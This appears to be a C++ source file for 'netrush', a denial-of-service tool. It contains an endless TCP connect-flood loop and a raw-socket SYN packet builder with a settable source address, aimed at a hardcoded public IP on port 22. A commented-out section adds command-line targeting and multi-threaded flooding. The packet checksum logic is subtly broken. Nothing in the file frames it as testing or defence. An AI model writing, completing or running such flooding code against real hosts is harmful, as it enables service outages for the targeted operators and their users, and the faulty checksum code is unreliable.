#include <iostream>
#include <thread>
#include <vector>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <csignal>
#include <cstring>

#include "argparse.hpp"

#define PACKET_LEN  sizeof(struct iphdr) + sizeof(struct tcphdr)

std::string dest_ip;
std::string junk = "x";
unsigned int dest_port;
unsigned int junk_length;
unsigned int thread_count = 1;

argparse::ArgumentParser aparser("netrush", "1.0");
sockaddr_in dest;
timeval timeout;
std::vector<std::thread> threads;

// Function to calculate checksum
unsigned short checksum(void *b, int len) {    
    unsigned short *buf = (unsigned short *)b; 
    unsigned int sum = 0; 
    unsigned short result; 

    for (sum = 0; len > 1; len -= 2) 
        sum += *buf++; 
    if (len == 1) 
        sum += *(unsigned char *)buf; 

    sum = (sum >> 16) + (sum & 0xFFFF); 
    sum += (sum >> 16); 
    result = ~sum; 

    return result; 
}

// do not require special privileges
void syn_flood()
{
    while (true)
    {
        int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sockfd < 0) std::cout << "Socket creation error. Errno: " << errno;
        setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
        int connection_status = connect(sockfd, (sockaddr*) &dest, sizeof(dest));
        close(sockfd);
    }
}

void raw_tcp_flood()
{
    int sockfd;
    char packet[PACKET_LEN];
    struct sockaddr_in dest;
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

    // Create raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("socket creation failed");
        exit(1);
    }
    
    // IP header
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(PACKET_LEN);
    ip->id = htonl(54321);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    ip->check = 0; // Set to 0 before calculating checksum
    ip->saddr = inet_addr("192.168.42.226"); // Source IP address
    ip->daddr = inet_addr("168.119.255.140"); // Destination IP address
    
    // TCP header
    tcp->source = htons(12345); // Source port
    tcp->dest = htons(22); // Destination port
    tcp->seq = htonl(0);
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->fin = 0;
    tcp->syn = 1; // SYN flag
    tcp->rst = 0;
    tcp->psh = 0;
    tcp->ack = 0;
    tcp->urg = 0;
    tcp->window = htons(5840); // Maximum window size
    tcp->check = 0; // Set to 0 before calculating checksum
    tcp->urg_ptr = 0;

    // IP checksum
    ip->check = checksum((unsigned short *)packet, ip->tot_len);

    // TCP pseudo-header for checksum calculation
    unsigned short tcp_len = sizeof(struct tcphdr);
    unsigned short total_len = tcp_len + sizeof(struct iphdr);
    char pseudo_packet[total_len];
    memcpy(pseudo_packet, packet, sizeof(struct iphdr));
    memcpy(pseudo_packet + sizeof(struct iphdr), tcp, sizeof(struct tcphdr));
    tcp->check = checksum((unsigned short *)pseudo_packet, total_len);

    // Destination address
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = ip->daddr;

    // Send the packet
    if (sendto(sockfd, packet, PACKET_LEN, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
        perror("sendto failed");
        close(sockfd);
        exit(1);
    }

    std::cout << "SYN packet sent successfully." << std::endl;

    close(sockfd);
}

int main(int argc, char* argv[])
{
    raw_tcp_flood();
    // // required arguments
    // aparser.add_argument("-I", "--ip").store_into(dest_ip).required().help("target IPv4 address.");
    // aparser.add_argument("-P", "--port").store_into(dest_port).required().help("target port.");

    // // additional arguments
    // aparser.add_argument("-J", "--junk-length").store_into(junk_length).help("length of the junk data that will be sent while raw_tcp_flood.");
    // aparser.add_argument("-T", "--threads").store_into(thread_count).help("thread count (default: 1).");

    // aparser.parse_args(argc, argv);

    // std::cout << "Initialization...\n";

    // /* ------------------------------------ */
    
    // dest.sin_family = AF_INET;
    // dest.sin_port = htons(dest_port);
    // inet_pton(AF_INET, dest_ip.c_str(), &dest.sin_addr);

    // timeout.tv_sec = 0;
    // timeout.tv_usec = 1;

    // /* ------------------------------------ */

    // std::cout << "Flooding now.\n";

    // /* ------------------------------------ */

    // for (int i = 0; i < thread_count; i++) threads.emplace_back(raw_tcp_flood);
    // for (std::thread &t : threads) t.join();

    // /* ------------------------------------ */
    return 0;
}